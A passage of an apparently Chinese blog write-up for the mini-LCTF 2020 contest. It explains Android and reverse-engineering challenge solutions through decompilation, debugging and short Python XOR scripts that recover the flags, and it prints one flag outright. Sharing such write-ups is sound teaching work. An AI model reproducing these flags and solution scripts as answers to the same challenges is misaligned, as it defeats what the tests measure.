+<p>解释到最后我感觉貌似第一题flag给错了，192.168.1.151才是攻击者……因为原题答案是wireshark服务端安在了中间人mac地址上，但是不太好意思再问了…但整体思路应该没有问题，协议题其实还是应该先踏踏实实学好计网，然后上手实验才能出真知啊。</p>
+</blockquote>
+<h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h3 id="1-TestOnly？"><a href="#1-TestOnly？" class="headerlink" title="1.TestOnly？"></a>1.TestOnly？</h3><p>首先看其中的内容<br>直接对其逆向</p>
+<p><img src="/images/miniL/a1.png"></p>
+<p>直接将其反编译成java代码，检查代码，并对java代码做审计，能够看见其将一串字符串做了sha1</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      String str = b(<span class="string">&quot;B08020D0FACFDAF81DB46890E4040EDBB8613DA5ABF038F8B86BD44525D2E27B26E22ACD06388112D8467FD688C79CC7EA83F27440577350E8168C2560368616&quot;</span>);</span><br><span class="line">      localObject = str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>取得其sha1之后的<br>33d40461bb5dc676ac72cfdd51f68bc5f88668c7  </p>
+<p>如下是一串字符串</p>
+<p><img src="/images/miniL/a2.png"></p>
+<p>其会对这个字符串和sha1之后的每一个字符做异或</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array=</span><br><span class="line">[<span class="number">85</span>,<span class="number">95</span>,<span class="number">5</span>,<span class="number">83</span>,<span class="number">75</span>,<span class="number">96</span>,<span class="number">94</span>,<span class="number">0</span>,<span class="number">17</span>,<span class="number">61</span>,<span class="number">102</span>,<span class="number">87</span>,<span class="number">80</span>,<span class="number">123</span>,<span class="number">4</span>,<span class="number">105</span>,<span class="number">85</span>,<span class="number">83</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">55</span>,<span class="number">85</span>,<span class="number">23</span>,<span class="number">48</span>,<span class="number">106</span>,<span class="number">1</span></span><br><span class="line">,<span class="number">40</span>,<span class="number">7</span>,<span class="number">97</span>,<span class="number">31</span>]</span><br><span class="line">str1=<span class="string">&#x27;33d40461bb5dc676ac72cfdd51f68bc5f88668c7&#x27;</span></span><br><span class="line">new_flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(array)):</span><br><span class="line">new_flag+=chr(array[i]^ord(str1[i]))</span><br><span class="line">print(new_flag)</span><br></pre></td></tr></table></figure>
+<h3 id="2-其他俩"><a href="#2-其他俩" class="headerlink" title="2.其他俩"></a>2.其他俩</h3><p>没做出来，我太菜了……..</p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="1-EasyRe"><a href="#1-EasyRe" class="headerlink" title="1.EasyRe"></a>1.EasyRe</h3><p>我们直接看代码很迷<br><img src="/images/miniL/re1.png"></p>
+<p>直接通过od来一个一个查出来<br><img src="/images/miniL/re3.png"></p>
+<p><img src="/images/miniL/re5.png"></p>
+<p>minil{easyre’s_easy}</p>
+<h2 id="2-Virtualization"><a href="#2-Virtualization" class="headerlink" title="2.Virtualization"></a>2.Virtualization</h2><p><img src="/images/miniL/vi1.png"><br>先看下程序大概是干啥，之后我们快速定位到对应的函数</p>
+<p><img src="/images/miniL/vi2.png"><br>其中有很多函数不知道其功能，通过使用od调试的时候来猜它是什么运算。</p>
+<p>之后根据算法，总共有三次循环，每次循环的功能基本一样，针对一个循环做分析<br><img src="/images/miniL/vi3.png"></p>
+<p>将自身的字符串与40624的6字节数组做异或操作，当v7大于6的时候，v7=0，然后再将异或后的字符和406050中的数组作比较，如果正确则通过，不正确，v11=0，错误。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">arr1=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">0xd</span>,<span class="number">0x15</span>,<span class="number">0x22</span>]</span><br><span class="line">arr2=<span class="string">&#x27;020408&#x27;</span></span><br><span class="line">arr3=<span class="string">&#x27;02040802040802040802040802040802&#x27;</span></span><br><span class="line">arr4=[<span class="number">0x7d</span>,<span class="number">0x5b</span>,<span class="number">0x5e</span>,<span class="number">0x5d</span>,<span class="number">0x7c</span>,<span class="number">0x7b</span>]</span><br><span class="line">arr5=[<span class="number">0x64</span>,<span class="number">0x74</span>,<span class="number">0x4b</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0x78</span>,<span class="number">0x44</span>,<span class="number">0x6d</span>,<span class="number">0x59</span>,<span class="number">0x67</span>,<span class="number">0x6f</span>,<span class="number">0x4e</span>,<span class="number">0x59</span>]</span><br><span class="line">arr6=[<span class="number">0x40</span>,<span class="number">0x44</span>,<span class="number">0x5d</span>,<span class="number">0x70</span>,<span class="number">0x54</span>,<span class="number">0x59</span>,<span class="number">0x48</span>,<span class="number">0x70</span>,<span class="number">0x40</span>,<span class="number">0x59</span>,<span class="number">0x77</span>,<span class="number">0x5e</span>,<span class="number">0x4f</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    flag+=chr(arr4[i]^ord(arr2[i]))</span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">    j=j%<span class="number">6</span></span><br><span class="line">    flag+=chr(ord(arr2[j])^arr5[i])</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">j=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">    j=j%<span class="number">6</span></span><br><span class="line">    flag+=chr(ord(arr2[j])^arr6[i])</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>BC</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://youngbc.cn/2020/05/17/mini-LCTF-wp/">https://youngbc.cn/2020/05/17/mini-LCTF-wp/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF%E6%AF%94%E8%B5%9BWP/"># CTF比赛WP</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/05/23/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%20__wakeup/">php反序列化漏洞绕过魔术方法 __wakeup</a>
+            
+            
+            <a class="next" rel="next" href="/2020/05/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98/">操作系统-生产者消费者问题</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© BC </span>
+    </div>
+	<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
+	<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">陕ICP备20005804号</a> 
+    <div>
+	<img src="/image/youpaiyun.png" width="5%" /></a>
+	<a href="http://www.beian.miit.gov.cn/" target="_blank" ></a>
+    </div>
+
+
+
+    </div>
+</body>
+</html>
